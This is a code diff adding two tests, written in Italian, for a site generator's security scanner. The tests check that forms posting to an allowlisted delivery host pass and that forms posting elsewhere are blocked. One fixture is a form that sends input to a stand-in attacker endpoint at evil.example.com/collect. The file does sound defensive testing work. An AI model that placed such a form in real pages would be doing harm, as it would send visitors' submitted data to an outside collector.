@@ -537,3 +537,21 @@ test('injectForms: segnaposto senza criterio viene rimosso', () => {
   const out = injectForms([{ route: '/', html: `A${CONTACT_MARKER}B` }], formSpec); // / non ha form
   assert.equal(out[0]!.html, 'AB');
 });
+
+test('scanner allowlist: il form verso l\'host di recapito consentito NON blocca; un altro host SI', () => {
+  const okForm = '<form action="https://api.web3forms.com/submit" method="POST"><input name="x"></form>';
+  const evilForm = '<form action="https://evil.example.com/collect" method="POST"><input name="x"></form>';
+  const scanner = makeBasicSecurityScanner({ allowedFormHosts: ['api.web3forms.com'] });
+  assert.equal(scanner.scan(okForm).blocked, false, 'host consentito non blocca');
+  const bad = scanner.scan(evilForm);
+  assert.equal(bad.blocked, true, 'host non consentito blocca');
+  assert.ok(bad.findings.some((f) => f.code === 'FORM_EXT_ACTION'));
+});
+
+test('scanner: il form deterministico col recapito consentito passa il gate', () => {
+  const d = makeWeb3FormsDelivery({ accessKey: 'abc' }).describe({ siteId: 's', subject: 'Studio' });
+  const formBlock = buildContactForm([{ label: 'Nome' }, { label: 'Email' }], 'Grazie', d);
+  const page = `<html><body>${formBlock}</body></html>`;
+  const scanner = makeBasicSecurityScanner({ allowedFormHosts: [d.endpointHost] });
+  assert.equal(scanner.scan(page).blocked, false);
+});
